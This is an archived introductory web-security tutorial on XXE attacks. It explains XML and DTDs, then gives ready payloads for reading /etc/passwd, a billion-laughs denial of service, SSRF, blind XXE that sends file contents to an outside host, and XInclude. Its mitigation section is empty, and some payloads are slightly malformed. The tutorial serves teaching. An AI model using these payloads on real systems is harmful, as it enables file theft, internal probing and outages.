# :globe_with_meridians: XXE: Web App Security Basics. XXE aka XML External Entity is an…

> **Original Source:** [XXE: Web App Security Basics. XXE aka XML External Entity is an…](https://infosecwriteups.com/xxe-web-app-security-basics-70ef8ed274f0)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# XXE: Web App Security Basics


XXE aka XML External Entity is an attack against an application which allows an XML input and an attacker can interfere with the application’s XML processing. In case of successful attack, the attacker can view file’s data on server, and many other attacks like path traversal, port scanning, denial of service or even access the internal machines of which the application has access (referring SSRF attack). It is ranked as 4th top attack in [OWASP Top 10 (2017)](https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html).


How this vulnerability arises?


When a weakly configured XML parser of application processes DTD (Document Type Declaration) i.e, internal or external, there is a high possibility that this vulnerability exists in the application. External DTD are more interesting because they allow entity’s value to be file path or URL.


External DTD Example:


```
POST /home/ HTTP/1.1
Host: www.idontknow.com<?xml version=”1.0" encoding=”UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM “file:///etc/passwd”> ]>
<foo>
&xxe;
</foo>
```


Let dig into some basic information:


What is XML?


XML (Extensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is markup language like HTML. It is quite self-descriptive.


What is DTD?


DTD stands for Document Type Definition. The purpose of DTD is to define the structure and the legal elements and attributes of an XML document. DTD starts with <!DOCTYPE delimiter. There are two types of DTD declaration:


- Internal DTD declaration: When the elements are declared within the XML.


```
<!DOCTYPE test
[ <!ENTITY xxe "Vulnerability">
]>
```


- External DTD declaration: When the elements are declared outside the XML. They are accessed by specifying the system attributes which may be either the legal *.dtd* file or a valid URL.


```
<!DOCTYPE test
[ <!ENTITY xxe SYSTEM “any_dtd_file.dtd”>
]>
```


Note: The XML specification does not allow you to include external entities in combination with internal entities.


Now Attacking part:


## Get Hemant Birdi’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


When application’s request looks like this:


```
POST http://somesite.com/xml HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data[
<!ELEMENT Test ANY>
<!ENTITY xxe "Possible">
]>
<foo>
&xxe;
</foo>
```


And Response comes out to be:


```
HTTP/1.0 200 OK

Possible
```


We can try different techniques and payloads here.


- File Disclosure: Getting the contents of ‘/etc/passwd’ file.


```
POST http://somesite.com/xml HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data[
<!ELEMENT Test ANY>
<!ENTITY xxe SYSTEM “file:///etc/passwd”>
]>
<foo>
&xxe;
</foo>
```


- Denial-of-Service: Referring Billion Laugh Attack. This simple payload can take upto 3 Gigabytes of memory.


```
POST http://somesite.com/xml HTTP/1.1<?xml version="1.0" ?>
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
<foo>
&lol9;
</foo>
```


- SSRF (Server Side Request Forgery): Attacker can send requests from the server to other resources to get sensitive information.


```
POST http://somesite.com/xml HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data[
<!ELEMENT Test ANY>
<!ENTITY xxe SYSTEM “https://www.othersite.com/text.txt”>
]>
<foo>
&xxe;
</foo>
```


- Blind XXE: When application is vulnerable to XXE, but not return the values of any defined external entities within its responses.


```
POST http://somesite.com/xml HTTP/1.1<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT Test ANY>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">
]>
<foo>
&blind;
</foo>
```


- XInclude: When application takes data from request to embed it into server-side XML document, XInclude attack technique can be used.


```
POST http://somesite.com/xml HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```


Mitigation:


Reference:

---

*Originally published on [Medium](https://infosecwriteups.com/xxe-web-app-security-basics-70ef8ed274f0). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
